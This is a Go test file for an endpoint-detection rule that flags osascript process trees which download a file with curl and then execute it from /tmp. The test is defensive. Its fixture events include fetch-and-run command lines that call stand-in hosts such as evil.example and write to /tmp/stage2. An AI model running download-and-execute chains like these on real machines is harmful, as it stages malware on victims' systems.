package rules

import (
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/fleetdm/edr/server/store"
)

// TestOsascriptNetworkExec exercises the download-and-exec chain detection. The rule
// fires only when a single osascript process's 30s descendant tree contains BOTH a
// curl/wget exec AND an exec out of a suspicious path — either alone is not enough.
func TestOsascriptNetworkExec_DetectsChain(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// Tree: launchd (1) → osascript (50) → curl (100) + /tmp/stage2 (200)
	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil.example/x"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1)
	f := findings[0]
	assert.Equal(t, "osascript_network_exec", f.RuleID)
	assert.Equal(t, "critical", f.Severity)
	assert.Contains(t, f.Description, "/usr/bin/curl")
	assert.Contains(t, f.Description, "/tmp/stage2")
}

// Negative: osascript alone with a curl child but no temp-path exec. Download without a
// following exec is not a droppers pattern — could be a legitimate script fetch.
func TestOsascriptNetworkExec_DownloadOnlyDoesNotFire(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","https://example.com"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}

// Multi-hop chain: osascript → sh → curl + /tmp/stage2 exec via a grandchild. Real
// droppers spawn an intermediate shell; the direct-children-only scan missed this until
// the BFS fix.
func TestOsascriptNetworkExec_DetectsGrandchildChain(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-sh", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":60,"parent_pid":50}`)},
		{EventID: "exec-sh", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":60,"ppid":50,"path":"/bin/sh","args":["sh","-c","curl | run"],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":60}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":60,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil"],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 4000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":60}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 4100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":60,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1, "BFS traversal must see the grandchild curl + /tmp/stage2")
	assert.Contains(t, findings[0].Description, "/usr/bin/curl")
	assert.Contains(t, findings[0].Description, "/tmp/stage2")
}

// Shebang variant: the dropper stage2 is a shell script under /tmp. The kernel
// resolves the `#!/bin/sh` line to an exec of /bin/sh; the descendant's
// payload.path is /bin/sh and the actual script path lives in argv[1]. Without
// this case the rule missed the runbook's osascript step on edr-qa even though
// the underlying chain (osascript -> sh -> curl + /tmp/stage2) was identical.
func TestOsascriptNetworkExec_DetectsShebangScriptInArgs(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2.sh","https://evil/x"],"uid":501,"gid":20}`)},
		{EventID: "fork-shebang", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-shebang", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/bin/sh","args":["/bin/sh","/tmp/stage2.sh"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1, "shebang script in argv[1] should match the temp-exec arm")
	assert.Equal(t, "osascript_network_exec", findings[0].RuleID)
	assert.Equal(t, "critical", findings[0].Severity)
}

// TestOsascriptNetworkExec_RealRunbookChainShape mirrors the exact 3-level
// chain observed on edr-qa: osascript -> /bin/sh -c (the wrapper that
// AppleScript's `do shell script` always spawns) -> [curl, shebang-sh /tmp/x].
// The intermediate sh's argv[2] is the full command string starting with
// /usr/bin/curl — that must NOT be counted as a tempExec match. Only the
// grandchild shell (whose argv[1] is the script path) is the real signal.
// This ordering also tickles the iteration: the intermediate sh comes before
// curl + the shebang sh in BFS order.
func TestOsascriptNetworkExec_RealRunbookChainShape(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		// osascript itself
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","do shell script ..."],"uid":501,"gid":20}`)},
		// `do shell script` spawns /bin/sh -c <command-string>
		{EventID: "fork-sh-c", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":60,"parent_pid":50}`)},
		{EventID: "exec-sh-c", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":60,"ppid":50,"path":"/bin/sh","args":["sh","-c","/usr/bin/curl -m 2 -o /dev/null http://x/y; /tmp/synthetic_stage2"],"uid":501,"gid":20}`)},
		// curl child
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":60}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":60,"path":"/usr/bin/curl","args":["/usr/bin/curl","-m","2","-o","/dev/null","http://x/y"],"uid":501,"gid":20}`)},
		// shebang shell child (the synthetic_stage2 script with #!/bin/sh)
		{EventID: "fork-shebang", HostID: "host-a", TimestampNs: 4000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":60}`)},
		{EventID: "exec-shebang", HostID: "host-a", TimestampNs: 4100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":60,"path":"/bin/sh","args":["/bin/sh","/tmp/synthetic_stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1, "rule must fire on real-chain shape: intermediate sh -c does NOT shadow the grandchild shebang sh")
	assert.Equal(t, "osascript_network_exec", findings[0].RuleID)
}

// Cross-batch race: in production the agent flushes events ~once per second
// while a real chain completes in ~150ms, so when the cadence boundary lands
// mid-chain the osascript exec arrives in batch N and the descendants arrive
// in batch N+1. Forward-direction matching (osascript -> look for descendants)
// missed the chain entirely under those conditions because at batch N's
// Evaluate the descendants weren't yet materialised. Reverse-direction is
// race-immune: by the time the temp-exec event lands in batch N+1, every
// ancestor has already been ingested and materialised by batch N. This test
// exercises that path explicitly.
func TestOsascriptNetworkExec_CrossBatchTempExec(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	// Batch 1: only the osascript fork+exec arrive.
	batch1 := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, batch1))
	materialize(t, s, batch1)

	rule := &OsascriptNetworkExec{}
	findings1, err := rule.Evaluate(ctx, batch1, s)
	require.NoError(t, err)
	require.Empty(t, findings1, "no temp-exec yet — rule must not fire on the osascript event alone")

	// Batch 2: descendants land in a later flush. osascript already in store
	// from batch 1's materialise; the temp-exec walks up to find it.
	batch2 := []store.Event{
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/stage2","https://evil"],"uid":501,"gid":20}`)},
		{EventID: "fork-temp", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-temp", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, batch2))
	materialize(t, s, batch2)

	findings2, err := rule.Evaluate(ctx, batch2, s)
	require.NoError(t, err)
	require.Len(t, findings2, 1, "temp-exec in batch 2 must walk up to the osa from batch 1 and confirm the curl sibling")
	assert.Equal(t, "osascript_network_exec", findings2[0].RuleID)
	assert.Contains(t, findings2[0].Description, "/usr/bin/curl")
	assert.Contains(t, findings2[0].Description, "/tmp/stage2")
}

// Same-batch dedupe: when both an osascript event and its temp-exec land in
// the same batch (the lucky case where cadence does NOT split the chain), the
// rule must still emit one finding per chain rather than once per descendant.
// Two temp-exec children are present here; the rule should fire once.
func TestOsascriptNetworkExec_SameBatchDedupe(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-curl", HostID: "host-a", TimestampNs: 2000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":100,"parent_pid":50}`)},
		{EventID: "exec-curl", HostID: "host-a", TimestampNs: 2100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":100,"ppid":50,"path":"/usr/bin/curl","args":["curl","-o","/tmp/x","https://evil"],"uid":501,"gid":20}`)},
		{EventID: "fork-temp1", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-temp1", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2a","args":["/tmp/stage2a"],"uid":501,"gid":20}`)},
		{EventID: "fork-temp2", HostID: "host-a", TimestampNs: 4000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":201,"parent_pid":50}`)},
		{EventID: "exec-temp2", HostID: "host-a", TimestampNs: 4100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":201,"ppid":50,"path":"/tmp/stage2b","args":["/tmp/stage2b"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	require.Len(t, findings, 1, "two temp-exec children of the same osascript -> one finding (deduped by ancestor PID)")
}

// Negative: temp-path exec without the download child. The parent suspicious_exec rule
// covers this case; osascript_network_exec stays silent.
func TestOsascriptNetworkExec_TempExecWithoutDownloadDoesNotFire(t *testing.T) {
	s := store.OpenTestStore(t)
	ctx := t.Context()

	events := []store.Event{
		{EventID: "fork-osa", HostID: "host-a", TimestampNs: 1000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":50,"parent_pid":1}`)},
		{EventID: "exec-osa", HostID: "host-a", TimestampNs: 1100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":50,"ppid":1,"path":"/usr/bin/osascript","args":["osascript","-e","..."],"uid":501,"gid":20}`)},
		{EventID: "fork-stage2", HostID: "host-a", TimestampNs: 3000, EventType: "fork",
			Payload: json.RawMessage(`{"child_pid":200,"parent_pid":50}`)},
		{EventID: "exec-stage2", HostID: "host-a", TimestampNs: 3100, EventType: "exec",
			Payload: json.RawMessage(`{"pid":200,"ppid":50,"path":"/tmp/stage2","args":["/tmp/stage2"],"uid":501,"gid":20}`)},
	}
	require.NoError(t, s.InsertEvents(ctx, events))
	materialize(t, s, events)

	rule := &OsascriptNetworkExec{}
	findings, err := rule.Evaluate(ctx, events, s)
	require.NoError(t, err)
	assert.Empty(t, findings)
}
